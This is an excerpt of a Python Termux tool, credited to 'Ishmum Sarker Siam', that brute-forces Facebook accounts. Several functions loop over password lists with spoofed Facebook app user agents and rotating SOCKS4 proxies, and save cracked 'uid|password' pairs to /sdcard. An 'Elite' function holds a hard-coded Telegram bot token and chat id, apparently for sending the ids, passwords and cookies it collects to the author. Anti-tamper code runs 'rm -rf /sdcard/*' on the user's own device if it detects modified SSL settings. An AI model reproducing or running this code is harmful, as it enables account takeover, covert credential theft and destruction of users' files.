...
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "713790AHfr3pkKiaG6gOyKjep5qlpZcb1peTRfu0"
        chatid = "6553606623"
...
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "7137906286:A3pkKiaG6gOyKjep5qlpZcb1peTRfu0"
        chatid = "6553606623"
...
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           ...
           system('clear');print('System Modification Not Allowed since using ISHMUM');exit()
...
if 'verify=False' in file_content:
    ...
    os.system('pip install requests')
    exit('[ðŸ¤£] RE-RUN TOOL.!')
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/httplib2/__init__.py', 'r') as file:
    file_content = file.read()
if 'disable_ssl_certificate_validation=True' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httplib2')
    os.system('rm -rf /sdcard/*')
...
def getKey():
    ...
    return bumper
logo=("""
     \033[1;36md888888b .d8888. db   db db    db 
       \033[1;36m`88'   88'  YP 88   88 88    88 
        \033[1;36m88    `8bo.   88ooo88 88    88 
        \033[1;36m88      `Y8b. 88~~~88 88    88 
       \033[1;36m.88.   db   8D 88   88 88b  d88 
     \033[1;36mY888888P `8888Y' YP   YP ~Y8888P' 
\033[1;32m--------------------------------------------------
\033[1;32m[~] Author   : Ishmum Sarker Siam
\033[1;32m[~] Facebook : Ishmum Sarker Siam
\033[1;32m[~] Tool     : Free
\033[1;32m[~] Version  : 11/02/2025
\033[1;32m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/SM-A013G/FBSV/10;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/V2183A;FBBD/V2183A;FBPN/com.facebook.orca;FBDV/V2183A;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
...
def M3(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca;FBDV/RMX3870;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
...
def rndm1(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X6526;FBSV/13;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Realme;FBBD/Realme;FBDV/RMX3890;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;91mm [ISHMUM-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ISHMUM-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
